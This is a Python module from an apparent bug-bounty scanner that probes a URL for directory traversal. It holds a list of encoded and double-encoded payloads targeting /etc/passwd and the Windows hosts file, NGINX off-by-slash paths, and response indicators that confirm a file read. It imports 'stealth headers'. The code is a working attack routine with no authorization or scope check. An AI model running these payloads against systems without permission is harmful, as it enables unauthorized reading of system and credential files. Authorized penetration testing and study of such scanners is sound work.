"""
Directory Traversal Scanner.
Ref: awesome-bugbounty-tools (dotdotpwn, FDsploit, off-by-slash).
"""
from urllib.parse import urlparse
from .utils import stealth_headers, safe_get

TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//....//....//etc/passwd",
    "..%252f..%252f..%252f..%252fetc%252fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "..%5c..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",
    "/etc/passwd%00",
    "....//....//....//etc/passwd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
]

TRAVERSAL_PARAMS = ["file", "path", "page", "doc", "folder", "dir", "include", "load", "read", "template", "view"]

LINUX_INDICATORS = ["root:x:0:0:", "daemon:x:1:", "bin:x:2:", "/bin/bash", "/bin/sh"]
WIN_INDICATORS = ["# Copyright", "[fonts]", "localhost", "127.0.0.1"]


def check_directory_traversal(url):
    """Test for path traversal using encoded/double-encoded payloads."""
    findings = []
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    for param in TRAVERSAL_PARAMS[:6]:
        for payload in TRAVERSAL_PAYLOADS[:6]:
            target = f"{base}?{param}={payload}"
            r = safe_get(target)
            if not r:
                continue

            is_linux = any(ind in r.text for ind in LINUX_INDICATORS)
            is_win = any(ind in r.text for ind in WIN_INDICATORS)

            if is_linux or is_win:
                os_type = "Linux" if is_linux else "Windows"
                findings.append({
                    "type": "DIRECTORY_TRAVERSAL",
                    "url": target,
                    "severity": "CRITICAL",
                    "confidence": "HIGH",
                    "detail": f"Path traversal confirmed ({os_type}) via {param}="
                })
                return findings

    # NGINX off-by-slash check
    nginx_paths = ["/static../etc/passwd", "/assets../etc/passwd", "/img../../../etc/passwd"]
    for path in nginx_paths:
        target = f"{parsed.scheme}://{parsed.netloc}{path}"
        r = safe_get(target)
        if r and any(ind in r.text for ind in LINUX_INDICATORS):
            findings.append({
                "type": "NGINX_ALIAS_TRAVERSAL",
                "url": target,
                "severity": "CRITICAL",
                "confidence": "HIGH",
                "detail": "NGINX alias traversal (off-by-slash) — file read confirmed"
            })
            return findings

    return findings if findings else None
